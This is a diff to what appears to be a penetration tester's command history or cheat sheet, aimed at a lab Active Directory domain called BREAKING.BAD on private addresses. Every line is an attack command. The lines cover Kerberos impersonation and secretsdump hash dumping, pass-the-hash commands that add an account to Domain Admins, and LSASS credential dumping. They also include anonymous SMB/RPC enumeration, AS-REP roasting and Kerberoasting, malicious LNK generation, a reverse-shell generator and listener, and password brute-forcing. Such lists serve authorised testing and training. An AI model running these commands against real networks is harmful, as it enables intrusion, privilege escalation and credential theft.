@@ -19,7 +19,8 @@ getST.py -spn host/DC02.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.5
 getST.py -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 secretsdump -k DC02.BREAKING.BAD
 secretsdump -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
-rpcclient -U "" -N DC01.BREAKING.BAD
+rpcclient -U '' -N DC01.BREAKING.BAD
+rpcclient -U BREAKING/anonymous 192.168.56.101
 pth-net rpc group members "Domain admins" -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
 pth-net rpc group addmem "Domain admins" Shutdown -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
@@ -48,12 +49,11 @@ lsassy -v -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
 lsassy -v -d BREAKING.BAD -u Administrator -p 'passw0rd' 192.168.56.0/24
 export KRB5CCNAME=Administrator.ccache
 lsassy -d BREAKING.BAD -u Administrator -k SV01.BREAKING.BAD
-nmap -Pn -sC -sV -T3 192.168.56.201
-nmap -F -T3 192.168.56.0/24
+nmap -sC -sV -p 139,445,80,21 192.168.56.201
+nmap -Pn -v -sS -F 192.168.56.0/24
 masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
 enum4linux -u anonymous -p anonymous DC01.BREAKING.BAD
-gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.56.0:8000/
 gobuster dir -w `fzf-wordlists` -u http://192.168.56.0:8000/
 cme smb 192.168.56.0/24 -u anonymous -p anonymous --shares
 cme smb 192.168.56.0/24 -u '' -p '' --shares
@@ -66,13 +66,10 @@ neo4j console
 lnk-generate.py --host 192.168.56.1 --type ntlm --output '@SHUTDOWN-LNK.lnk'
 autorecon 192.168.10.10
 nmap --script=ldap-search -p 389 192.168.10.10
-nmap -sC -sV -T4 -p- -v 192.168.10.10
 nmap -p 5900 --script=realvnc-auth-bypass 192.168.10.10
 dirb http://192.168.10.10 /usr/share/seclists/Discovery/Web-Content/big.txt
-gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.10.10/
-gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.10.10/
-gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi -u http://192.168.10.10/
-gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20 -x txt,bak,tar.gz,tgz,zip -u http://192.168.10.10/
+gobuster dir -w `fzf-wordlists` -t 20 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi -u http://192.168.10.10/
+gobuster dir -w `fzf-wordlists` -t 20 -x txt,bak,tar.gz,tgz,zip -u http://192.168.10.10/
 smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
 smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
@@ -102,10 +99,6 @@ smbclient '\\192.168.10.10\test'
 smbclient -N '\\192.168.10.10\test'
 smbclient -N -L '\\192.168.10.10'
 nmap --script smb-enum-shares -p 139,445 -T4 -Pn 192.168.10.10
-rpcclient -U '' -N 192.168.10.10
-enum4linux -s 192.168.10.10
-enum4linux -U 192.168.10.10
-enum4linux -P 192.168.10.10
 enum4linux -a 192.168.10.10
 amap -d 192.168.10.10 4455
 nikto -host 192.168.10.10
@@ -117,6 +110,7 @@ shellerator --reverse-shell --ip 192.168.56.1 --port 1337 --type powershell
 shellerator
 rlwrap -nc lvnp 1337
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt BREAKING.BAD/anonymous:anonymous
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip 192.168.56.101 BREAKING.BAD/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
 GetUserSPNs.py -outputfile Kerberoastables.txt BREAKING.BAD/anonymous:anonymous
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
@@ -151,3 +145,5 @@ wfuzz -c --hw 157 -L -w `fzf-wordlists` -w `fzf-wordlists` -X POST -d 'username=
 wfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/darkweb2017-top100.txt --basic FUZZ:FUZ2Z http://192.168.10.10/secretpage
 pypykatz lsa minidump lsass.dmp
 enyx 1 public 192.168.10.10
+wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<host>" http://192.168.10.10/
+wfuzz --hc 403,404 -w /usr/share/seclists/Discovery/Web-Content/big.txt -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt http://192.168.10.10/FUZZFUZ2Z
